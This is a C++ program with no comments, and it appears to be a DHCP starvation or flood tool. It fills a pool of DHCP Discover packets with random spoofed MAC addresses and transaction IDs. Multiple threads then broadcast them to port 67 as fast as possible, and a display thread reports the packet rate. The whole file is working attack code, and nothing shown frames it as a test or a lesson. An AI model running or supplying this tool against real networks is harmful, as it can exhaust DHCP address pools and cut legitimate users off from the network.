#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <vector>
#include <atomic>
#include <random>
#include <array>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <iomanip>

#pragma pack(push, 1)
struct DHCP {
    uint8_t op;
    uint8_t htype;
    uint8_t hlen;
    uint8_t hops;
    uint32_t xid;
    uint16_t secs;
    uint16_t flags;
    uint32_t ciaddr;
    uint32_t yiaddr;
    uint32_t siaddr;
    uint32_t giaddr;
    uint8_t chaddr[16];
    char sname[64];
    char file[128];
    uint8_t options[240];
};
#pragma pack(pop)

constexpr size_t PACKET_POOL_SIZE = 1024;
std::array<DHCP, PACKET_POOL_SIZE> packet_pool;
std::atomic<uint64_t> packets_sent_last_second(0);
std::atomic<bool> should_exit(false);

void generate_random_mac(uint8_t* mac) {
    static thread_local std::mt19937 gen(std::random_device{}());
    static std::uniform_int_distribution<> dis(0, 255);

    mac[0] = 0x52;
    mac[1] = 0x54;
    mac[2] = 0x00;
    mac[3] = dis(gen) & 0x7F;
    mac[4] = dis(gen);
    mac[5] = dis(gen);
}

void initialize_packet_pool() {
    for (auto& packet : packet_pool) {
        packet.op = 1;  // BOOTREQUEST
        packet.htype = 1;  // Ethernet
        packet.hlen = 6;  // MAC address length
        packet.hops = 0;
        packet.secs = 0;
        packet.flags = htons(0x8000);  // Broadcast
        packet.ciaddr = 0;
        packet.yiaddr = 0;
        packet.siaddr = 0;
        packet.giaddr = 0;

        generate_random_mac(packet.chaddr);

        // DHCP Discover options
        packet.options[0] = 53;  // DHCP Message Type
        packet.options[1] = 1;   // Length
        packet.options[2] = 1;   // Discover
        packet.options[3] = 255; // End option

        // Randomize XID
        packet.xid = rand();
    }
}

void send_packets(int thread_id) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Failed to create socket");
        return;
    }

    int broadcast = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast)) < 0) {
        perror("Failed to set SO_BROADCAST");
        close(sock);
        return;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(67);
    addr.sin_addr.s_addr = INADDR_BROADCAST;

    uint64_t local_counter = 0;
    size_t packet_index = thread_id % PACKET_POOL_SIZE;

    while (!should_exit.load(std::memory_order_relaxed)) {
        DHCP& packet = packet_pool[packet_index];
        
        // Update MAC and XID for some variability
        if (local_counter % 1000 == 0) {
            generate_random_mac(packet.chaddr);
            packet.xid = rand();
        }

        if (sendto(sock, &packet, sizeof(DHCP), 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            perror("Failed to send packet");
        } else {
            local_counter++;
        }

        packet_index = (packet_index + 1) % PACKET_POOL_SIZE;

        if (local_counter % 10000 == 0) {  // Update less frequently to reduce atomic operations
            packets_sent_last_second.fetch_add(local_counter, std::memory_order_relaxed);
            local_counter = 0;
        }
    }

    close(sock);
}

void display_count() {
    uint64_t total_packets = 0;
    auto start_time = std::chrono::steady_clock::now();

    while (!should_exit.load(std::memory_order_relaxed)) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        auto current_time = std::chrono::steady_clock::now();
        uint64_t packets_this_second = packets_sent_last_second.exchange(0, std::memory_order_relaxed);
        total_packets += packets_this_second;

        double elapsed_time = std::chrono::duration<double>(current_time - start_time).count();
        double rate = packets_this_second;
        double avg_rate = total_packets / elapsed_time;

        std::cout << "Packets sent: " << total_packets 
                  << ", Rate: " << std::fixed << std::setprecision(2) << rate << " pps"
                  << ", Avg: " << std::fixed << std::setprecision(2) << avg_rate << " pps" << std::endl;
    }
}

int main() {
    srand(time(nullptr));
    initialize_packet_pool();

    unsigned int num_threads = std::thread::hardware_concurrency() * 2;
    std::vector<std::thread> threads;

    for (unsigned int i = 0; i < num_threads; i++) {
        threads.emplace_back(send_packets, i);
    }

    std::thread display_thread(display_count);

    std::cout << "Press Enter to stop..." << std::endl;
    std::cin.get();
    should_exit.store(true, std::memory_order_relaxed);

    for (auto& t : threads) {
        t.join();
    }
    display_thread.join();

    return 0;
}
